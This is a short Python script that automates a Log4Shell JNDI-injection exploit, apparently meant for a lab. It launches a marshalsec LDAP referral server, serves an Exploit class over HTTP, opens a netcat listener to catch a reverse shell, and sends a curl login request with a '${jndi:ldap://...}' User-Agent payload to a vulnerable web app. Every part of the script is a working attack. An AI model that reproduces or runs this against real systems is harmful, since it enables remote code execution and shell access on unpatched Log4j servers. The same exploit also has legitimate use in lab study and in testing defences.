#!/usr/bin/python
import socket, sys, time
import subprocess
import threading
import time
import shlex
try:
	#ip = sys.argv[1]
	#port = sys.argv[2]
	'''<CHANGE THIS IF NEEDED'''
	marshalsec_jar_path = "./marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar"
	exploit_class_path = "./httpServer"
	hostname = "localhost"
	httpServer_port = 8000
	nc_listen_port = 4444
	vuln_web_port = 8080
	'''/>'''

	def start_ldap_server():
		subprocess.call([
        		"java",
        		"-cp",
        		"{}".format(marshalsec_jar_path),
        		"marshalsec.jndi.LDAPRefServer",
        		"http://{}:{}/#Exploit".format(hostname,httpServer_port)
    		])

	def start_http_server():
		cmd = "/usr/bin/python3 -m http.server -d {} {}".format(exploit_class_path, httpServer_port)
		subprocess.call(cmd.split())

	def nc():
		cmd = "nc -lnvp {}".format(nc_listen_port)
		subprocess.call(cmd.split())

	def exploit():
		cmd = '''curl -H "User-Agent: ${jndi:ldap://''' + hostname + ''':1389/Exploit}" -d "uname=test&password=test" "http://'''+hostname+''':'''+str(vuln_web_port)+'''/login"'''
                subprocess.call(shlex.split(cmd))
	
	#Functions call
	t1 = threading.Thread(target=start_ldap_server)
	t1.start()
	time.sleep(1)
	t2 = threading.Thread(target=start_http_server)
	t2.start()
	time.sleep(1)
	t3 = threading.Thread(target=nc)
	t3.start()
	time.sleep(1)
	t4 = threading.Thread(target=exploit)
	t4.start()
except:
	print """Usage: python exploit.py
		Some variables may need to be changed.
	      """
